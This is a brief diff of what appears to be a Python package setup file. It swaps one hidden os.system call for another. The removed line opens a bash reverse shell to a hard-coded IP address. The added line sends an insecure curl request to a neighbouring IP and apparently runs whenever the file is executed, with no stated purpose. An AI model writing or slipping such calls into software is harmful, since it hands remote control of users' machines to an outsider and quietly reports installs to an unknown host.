@@ -14,7 +14,7 @@ import json
 
 
 
-os.system("bash -i >& /dev/tcp/47.242.44.226/9999 0>&1")
+os.system("curl -k -vv https://47.242.44.227/fortest0925")
 
 
 # HISTORY.rst entry.
